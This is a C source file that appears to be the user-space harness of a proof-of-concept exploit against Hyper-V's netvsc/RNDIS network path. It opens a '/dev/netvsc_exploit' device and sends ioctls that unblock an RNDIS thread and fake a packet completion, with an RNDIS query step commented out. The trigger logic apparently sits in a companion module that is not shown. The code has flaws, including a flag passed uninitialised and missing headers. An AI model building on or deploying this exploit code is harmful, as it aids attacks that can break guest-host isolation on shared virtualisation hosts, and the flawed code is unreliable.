#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "hyper_v.h"


#define HYPERV_NETVSC_DEV_NAME "/dev/netvsc_exploit"

typedef unsigned int u32;
typedef _Bool bool;

int main()
{
	char buf[256];
	bool block;
	int ret;
	int fd = open(HYPERV_NETVSC_DEV_NAME, O_RDWR);
	if(-1	==	fd)
	{
		perror("[*]open  netvsc_exploit fail.");
		goto __EXIT;
	}

	memset(buf, 0, sizeof(buf));

	unsigned int recv_buf_size = 0x4B * 0x1000;
	
	printf("[*]hyper_v: unblock rndis thread.\n");
	ret = ioctl(fd, HYPERV_IOCTL_SET_BLOCK_RNDIS_THREAD, &block, sizeof(block));
	if(0	!= ret)
	{
		perror("[*]hyper_v: unblock rndis thread fail.");
		goto __EXIT;
	}printf("[*]hyper_v: send rndis pkt comp.\n");
	block = 0;
	ret = ioctl(fd, HYPERV_IOCTL_SEND_PKT_COMPLETE, &block, sizeof(block));
	if(0	!= ret)
	{
		perror("[*]hyper_v: send rndis send pkt comp fail.");
		goto __EXIT;
	}

	
	printf("[*]hyper_v: send %d rndis query.\n", 0);
	/*ret = ioctl(fd, HYPERV_IOCTL_QUERY, &recv_buf_size, sizeof(recv_buf_size));
	if(0	!=	ret)
	{
		perror("[*]hyper_v send rndis query fail.");
		goto __EXIT;	
	}*/

__EXIT:
	if(-1	!=	fd)
	{
		close(fd);
	}
	return 0;
}